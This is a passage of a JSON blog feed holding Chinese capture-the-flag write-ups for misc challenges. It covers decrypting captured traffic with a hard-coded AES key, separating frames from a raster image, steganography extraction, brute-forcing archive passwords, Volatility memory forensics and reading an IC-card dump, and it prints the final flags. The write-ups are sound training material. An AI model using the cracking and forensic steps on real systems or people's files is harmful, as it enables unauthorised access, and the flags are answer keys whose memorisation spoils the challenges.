class=\"line\"></span><br><span class=\"line\">def aes_cbc_decrypt(key, iv, encrypted_text):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        encrypted_text = base64.b64decode(encrypted_text)</span><br><span class=\"line\">        cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class=\"line\"></span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        unpadded_text = _unpad(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\">        return unpadded_text.decode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        return str(e)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def _unpad(text):</span><br><span class=\"line\">    pad = text[-1]</span><br><span class=\"line\">    return text[:-pad]</span><br><span class=\"line\">KEY = &quot;e46023a69f8db309&quot;</span><br><span class=\"line\">IV = &quot;0123456789abcdef&quot;</span><br><span class=\"line\">key = KEY.encode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">iv = IV.encode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">encrypted_text = input(&quot;ENCRYPTDATA：&quot;)</span><br><span class=\"line\">decrypted_text = aes_cbc_decrypt(key, iv, encrypted_text)</span><br><span class=\"line\">print(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\">new = open(&#x27;out.txt&#x27;,&#x27;w&#x27;)</span><br><span class=\"line\">new.write(decrypted_text)</span><br></pre></td></tr></table></figure>\n<p>为了复制大数据方便就给他输出到文本当中了<br>\n在第二个请求包的</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PmszV03fw7AzE9Fc.png!thumbnail\" alt=\"\"></p>\n<p>将 content 字段解码得到了 password.png</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Mp2nPkgSXbalwRE1.png!thumbnail\" alt=\"\"></p>\n<p>同样在第 5 个请求包解码得到了 7z 压缩包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5MlhF2QdGzI2mklW.png!thumbnail\" alt=\"\"></p>\n<p>分别导出，发现压缩包需要密码，需要解密图片拿到密码</p>\n<p>该图片是五帧的光栅图，也就是五个图层通过位移、消除操作合并成的一张图片</p>\n<p>关于这个 5 层是怎么来的现在所知道的只有试，本质上就是隔 n 个像素提取 1 列进行组合看看能不能拼成可识别的图形</p>\n<h3 id=\"方法一\"><a class=\"markdownIt-Anchor\" href=\"#方法一\">#</a> 方法一：</h3>\n<p>知道了原理之后利用脚本进行提取（均为赛后别的师傅的脚本，来利用学习）：</p>\n<p>一：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from PIL import Image</span><br><span class=\"line\">import numpy as np</span><br><span class=\"line\"></span><br><span class=\"line\">img = Image.open(&#x27;Password.png&#x27;).convert(&#x27;L&#x27;)</span><br><span class=\"line\">width, height = img.size</span><br><span class=\"line\">img_data = np.array(img)</span><br><span class=\"line\">start = 1</span><br><span class=\"line\">interval = 5</span><br><span class=\"line\">for i in range(start, width, interval):</span><br><span class=\"line\">        img_data[:, i:i+interval-1] = 0</span><br><span class=\"line\">Image.fromarray(img_data)</span><br><span class=\"line\"></span><br><span class=\"line\">new_image = Image.fromarray(img_data)</span><br><span class=\"line\">new_image.save(&#x27;processed_image.png&#x27;)</span><br></pre></td></tr></table></figure>\n<p>二：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from PIL import Image</span><br><span class=\"line\">import numpy as np</span><br><span class=\"line\"></span><br><span class=\"line\">img = np.array(Image.open(&#x27;Password.png&#x27;))</span><br><span class=\"line\">for i in range(5):</span><br><span class=\"line\">    z = np.zeros_like(img)</span><br><span class=\"line\">    z[:, i::5, :] = img[:, i::5, :]</span><br><span class=\"line\">    Image.fromarray(z).show()</span><br></pre></td></tr></table></figure>\n<p>以上两个脚本都能正确分离出五帧光栅图，使用的均是相隔 5 个像素进行提取的方法</p>\n<h3 id=\"方法二\"><a class=\"markdownIt-Anchor\" href=\"#方法二\">#</a> 方法二：</h3>\n<p>去了解一下光栅图的制作方法可以知道，光栅图其实就是利用了人的肉眼补全原理，加上多张文字的消除、偏移、重叠而成。重叠之后人的肉眼无法辨别而达到一个隐藏的作用，因此可以根据光栅与帧数的公式去制作光栅，使人的肉眼能够辨别每一帧的字符，达到一个 &quot;分离&quot; 的效果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">（黑色像素宽度+白色像素宽度）/ 白色像素宽度 = 帧数</span><br></pre></td></tr></table></figure>\n<p>因此这里使用 PS 制作黑色为 4 像素，白色为 1 像素的光栅<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/gMFtoLM7ssjkOeL6.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>移动光栅能得到全部的 5 帧文字</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DJQBF4uztmylpLbP.png!thumbnail\" alt=\"\"></p>\n<p>得到 password：PPeRLR6SEmHGC</p>\n<p>解开压缩包得到 flag</p>\n<p><strong>DASCTF{d68b6013-d70a-4ada-926d-68fe3265360a}</strong></p>\n<p>总结：这次比赛的 misc 题有点少，前面两题一般，最后的光栅图挺有意思的</p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/2023%E9%87%91%E7%9B%BE%E6%9D%AFMisc/",
            "url": "https://nnnpc.github.io/2024/04/16/2023%E9%87%91%E7%9B%BE%E6%9D%AFMisc/",
            "title": "2023金盾杯Misc",
            "date_published": "2024-04-16T05:58:18.963Z",
            "content_html": "<h2 id=\"来都来了\"><a class=\"markdownIt-Anchor\" href=\"#来都来了\">#</a> 来都来了</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127173633085.png\" alt=\"\"></p>\n<p>得到伪加密附件，修改数据 09 为 00</p>\n<p>解压压缩包得到：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127174314449.png\" alt=\"\"></p>\n<p>解码保存为文本文件，缩小得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127174428740.png\" alt=\"\"></p>\n<h2 id=\"honor\"><a class=\"markdownIt-Anchor\" href=\"#honor\">#</a> honor</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127175353529.png\" alt=\"\"></p>\n<p>得到一张 png，拖入 winhex 查看，发现是 jpg 的文件尾，搜索文件头手撕下来</p>\n<p>得到 jpg</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127175512078.png\" alt=\"\"></p>\n<p>没有找到有用信息，利用 stegseek 进行 steghide 爆破</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127175623360.png\" alt=\"\"></p>\n<p>得到：f6l3-a6ag3c}{-bc4c5e28-e4649c76b0-707e6069</p>\n<p>W 型栅栏爆破得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127175759498.png\" alt=\"\"></p>\n<p><strong>flag{424c076e-768c-3636-acb5-4676900b9eec}</strong></p>\n<h2 id=\"芙宁娜\"><a class=\"markdownIt-Anchor\" href=\"#芙宁娜\">#</a> 芙宁娜</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127175928269.png\" alt=\"\"></p>\n<p>解压附件拿到图片，解码图片上的 base64 得到前半段 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;bc8394aa-7e32-47e8-a9fd-1bf683af</span><br></pre></td></tr></table></figure>\n<p>背景图上有不少的数据，但是被遮挡无法直接进行识别提取，这里可以 winhex 或者 010 直接在文件结构中提取数据块</p>\n<p>也可以使用 exiftools 直接进行提取，这里需要注意一个点，背景图上四个数据块的顺序是错误的，按照从上到下依次标号为 1、2、3、4，那么正确的顺序应该是 1、2、4、3，排列好之后将提取后的数据以 16 进制的形式写入到文件当中（这里对没有逆过 pyc 的我来说有点坐牢）</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127180734668.png\" alt=\"\"></p>\n<p>查看文件头发现是 pyc 文件，想到了剑龙隐写，这里需要 python3.6 的环境来运行，但尝试了好多次依然报错，和背景图没有被遮挡的部分比较，发现有一些数据被出题人篡改了，需要自己手动改回来（这里我直接放出改完之后的文件比较结果，方便查看）</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127181702566.png\" alt=\"\"></p>\n<p>对照修改之后重新利用 stegosaurus 得到后半段 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./stegosaurus.py -x 2.pyc</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127182159447.png\" alt=\"\"></p>\n<p>拼接得到完整 flag，<strong>flag{bc8394aa-7e32-47e8-a9fd-1bf683af8e8f}</strong></p>\n<p>ps：最后一道流量实在是太杂太大了，wireshark 跑不动，没继续做了</p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E2%80%9C%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A1%B9-%E5%AD%A6%E7%94%9F%E7%BB%84%E5%88%9D%E8%B5%9Bmisc/",
            "url": "https://nnnpc.github.io/2024/04/16/%E2%80%9C%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A1%B9-%E5%AD%A6%E7%94%9F%E7%BB%84%E5%88%9D%E8%B5%9Bmisc/",
            "title": "“技能兴鲁”网络安全赛项-学生组初赛misc",
            "date_published": "2024-04-16T05:58:18.960Z",
            "content_html": "<h2 id=\"时间不多了\"><a class=\"markdownIt-Anchor\" href=\"#时间不多了\">#</a> 时间不多了</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">题目描述: 2023还有两个月不到就过去了，你准备好迎接2024了吗?</span><br></pre></td></tr></table></figure>\n<p>解压附件得到很多张二维码和一张日历，用脚本批量扫描看看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">from PIL import Image</span><br><span class=\"line\">from pyzbar.pyzbar import decode</span><br><span class=\"line\"></span><br><span class=\"line\">def scan_qrcodes(directory):</span><br><span class=\"line\">    with open(&#x27;qrcode_results.txt&#x27;, &#x27;w&#x27;) as output_file:</span><br><span class=\"line\">        file_list = sorted(os.listdir(directory), key=lambda x: int(&#x27;&#x27;.join(filter(str.isdigit, x))))</span><br><span class=\"line\">        for file_name in file_list:</span><br><span class=\"line\">            file_path = os.path.join(directory, file_name)</span><br><span class=\"line\">            try:</span><br><span class=\"line\">                decoded = decode(Image.open(file_path))</span><br><span class=\"line\">                if decoded:</span><br><span class=\"line\">                    output_file.write(f&quot;File: &#123;file_name&#125;\\n&quot;)</span><br><span class=\"line\">                    for obj_number, obj in enumerate(decoded, start=1):</span><br><span class=\"line\">                        output_file.write(f&quot;QR Code &#123;obj_number&#125; data: &#123;obj.data.decode(&#x27;utf-8&#x27;)&#125;\\n&quot;)</span><br><span class=\"line\">                    output_file.write(&quot;\\n&quot;)</span><br><span class=\"line\">            except Exception as e:</span><br><span class=\"line\">                pass</span><br><span class=\"line\">scan_qrcodes(&#x27;attachment&#x27;)</span><br></pre></td></tr></table></figure>\n<p>发现大部分二维码都是没用的，少部分有 base64 编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">File 2: attachment\\qrcode_10.png</span><br><span class=\"line\">QR Code data: MiAzIDQgOSAxNSAxNyAxOCAyMyAzMA==</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_12.png</span><br><span class=\"line\">QR Code 1 data: NiAxMyAyMCAyNyAyOA==</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_14.png</span><br><span class=\"line\">QR Code 1 data: MiAxNSAyMiAxNyAyNCAxNg==</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_15.png</span><br><span class=\"line\">QR Code 1 data: NiA1IDQgMTEgMTggMjUgMjYgMjcgMjggMjAgMjE=</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_16.png</span><br><span class=\"line\">QR Code 1 data: MiAzIDkgMTUgMjMgMzAgMzE=</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_25.png</span><br><span class=\"line\">QR Code 1 data: NSAxMyAyMCAyNyAxNCAyMQ==</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_26.png</span><br><span class=\"line\">QR Code 1 data: NiAxOSAyNiAyMSAyOCAyMA==</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_27.png</span><br><span class=\"line\">QR Code 1 data: OSAxMCAxMSAxNyAyNCAzMQ==</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_35.png</span><br><span class=\"line\">QR Code 1 data: MSAyIDMgOCAxNSAxNiAxNyAyMiAyOSAzMA==</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_36.png</span><br><span class=\"line\">QR Code 1 data: MiAzIDkgMTYgMTcgMjQgMzAgMzE=</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_37.png</span><br><span class=\"line\">QR Code 1 data: MiA4IDE1IDIzIDI0IDE4IDExIDM=</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_38.png</span><br><span class=\"line\">QR Code 1 data: MSAyIDkgMTcgMjMgMzAgMjk=</span><br></pre></td></tr></table></figure>\n<p>解码所有的 base64</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2 3 4 9 15 17 18 23 30</span><br><span class=\"line\">6 13 20 27 28</span><br><span class=\"line\">2 15 22 17 24 16</span><br><span class=\"line\">6 5 4 11 18 25 26 27 28 20 21</span><br><span class=\"line\">2 3 9 15 23 30 31</span><br><span class=\"line\">5 13 20 27 14 21</span><br><span class=\"line\">6 19 26 21 28 20</span><br><span class=\"line\">9 10 11 17 24 31</span><br><span class=\"line\">1 2 3 8 15 16 17 22 29 30</span><br><span class=\"line\">2 3 9 16 17 24 30 31</span><br><span class=\"line\">2 8 15 23 24 18 11 3</span><br><span class=\"line\">1 2 9 17 23 30 29</span><br></pre></td></tr></table></figure>\n<p>接下来就和键盘差不多，在日历上依次拼接连接即可，每一行代表一个字符<br>\n<strong> flag*</strong>*{DATESO}**</p>\n<h2 id=\"未知的加密\"><a class=\"markdownIt-Anchor\" href=\"#未知的加密\">#</a> 未知的加密</h2>\n<p>拿到加密的压缩包，先拖入 winhex 看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BhH1uvhFnJvZolRU.png!thumbnail\" alt=\"\"></p>\n<p>末尾说明了压缩包密码的构造，进行掩码爆破</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9gCMAm0yJcVwZocF.png!thumbnail\" alt=\"\"></p>\n<p>得到密码 Sierting2023，解压压缩包</p>\n<p>file 知道是一个磁盘镜像文件，使用取证大师导出其中的 enc（这里也可以使用 7z 解压出 enc，方法挺多的，能导出即可）</p>\n<p>接着使用 vc 挂载 enc 文件，密码依然是 Sierting2023</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mJCBdGUO4Elr5vxl.png!thumbnail\" alt=\"\"></p>\n<p>hint 指示我们需要去恢复 swp 文件，swp 文件便是使用 vim 编辑器时因为错误退出而生成的一个备份文件，直接用 vim 命令恢复即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim -r .flag.swp</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JLTuOWjqHeRXgQg9.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{d89421ac9cf847b0173ee08a74cfd48b}</strong></p>\n<h2 id=\"datas_secret\"><a class=\"markdownIt-Anchor\" href=\"#datas_secret\">#</a> Datas_secret</h2>\n<p>解压附件得到 vmem 文件，内存取证，使用工具：vol2</p>\n<p>首先使用 imageinfo 查看操作系统</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f image.vmem imageinfo</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ooTpipU5eYhTLRG7.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>接着使用 filescan 扫描并过滤带有 flag 字段的文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Tb01SWkGJKYanvcd.png!thumbnail\" alt=\"\"></p>\n<p>找到 flag.txt，dump 下来得到 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f image.vmem --profile=Win7SP1x64 dumpfiles -Q 0x0000000007a09f20 -D ./</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DSFO7E1jqHGlXyyg.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{23030d1c2aa90debdf7757782e9f1ee9}</strong></p>\n<h2 id=\"卑劣的手段\"><a class=\"markdownIt-Anchor\" href=\"#卑劣的手段\">#</a> 卑劣的手段</h2>\n<p>同样是内存取证题，使用工具：vol2</p>\n<p>但是这次 filescan 过滤 flag 字段并没有找到任何的东西</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f image.vmem --profile=WinXPSP1x64 filescan | findstr flag</span><br></pre></td></tr></table></figure>\n<p>于是使用取证大师的内存取证工具导出 excel 表进行寻找<br>\n结合题目，找到了名称为 Chuyin 的文件夹，使用 vol2 进行 filescan</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f image.vmem --profile=WinXPSP1x64 filescan | findstr Chuyin</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TVsRwmkiLs7LAA5e.png!thumbnail\" alt=\"\"></p>\n<p>找到一张 png，dump 下来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f image.vmem --profile=WinXPSP1x64 dumpfiles -Q 0x0000000002d44eb0 -D ./</span><br></pre></td></tr></table></figure>\n<p>zsteg 一把梭<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IjqvySFc7pLO47KK.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>flag{Hat3une_M1ku}</strong></p>\n<h2 id=\"ic-card\"><a class=\"markdownIt-Anchor\" href=\"#ic-card\">#</a> IC-Card</h2>\n<p>这题我个人感觉是比较难的一道题，因为之前没有碰到过 ICcard 的知识点，趁着这次机会记录一下</p>\n<p>首先先去了解一下 IC 卡的扇区构造</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/U0zUwoWBCfy7m24v.png!thumbnail\" alt=\"\"></p>\n<p>一个扇区分为 4 个区块，每个区块也就是 16 字节，这里使用 winhex 进行查看 bin 文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PWYFEVEb1cebKvRZ.png!thumbnail\" alt=\"\"></p>\n<p>这里所选中的是 0 扇区 1 区块，记录了持卡人的姓名和生日</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmNocnQuY29tL3Rvb2xzL2hleC10by1hc2NpaS8=\">https://www.bchrt.com/tools/hex-to-ascii/</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xYNtG11XFVvJzOMM.png!thumbnail\" alt=\"\"></p>\n<p>区块 2 便是手机号和余额</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/C6PV0ajOKINGA9a3.png!thumbnail\" alt=\"\"></p>\n<p>这里能看到为 18888888888，580</p>\n<p>根据 IC 卡的扇区构造可以知道，扇区 1 的数据存储 0 在前</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/omy0WMh2N4g1zklW.png!thumbnail\" alt=\"\"></p>\n<p>因此需要将这里的数据进行逆序再进行编码转换</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = &quot;00 00 00 00 13 66 13 47 13 36 13 E6 13 37 13 17&quot;</span><br><span class=\"line\">s = a[::-1]</span><br><span class=\"line\">print(s)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IhaZgjBEXRXrsG61.png!thumbnail\" alt=\"\"></p>\n<p>得到 q1s1n1c1t1f1，便是 IC-Card 中包含的密码</p>\n<p>解压压缩包，得到 tar 的镜像文件</p>\n<p>使用 docker 进行导入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker load -i card_image.tar #导入tar镜像</span><br><span class=\"line\">docker images #查看镜像ID</span><br><span class=\"line\">docker run -it [IMAGE ID] /bin/sh #运行</span><br></pre></td></tr></table></figure>\n<p>最终在根目录下解码 base64 得到 flag<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YUZavMCkH5JvVuJs.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>flag{f11agggiveyou!!!}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        }
    ]
}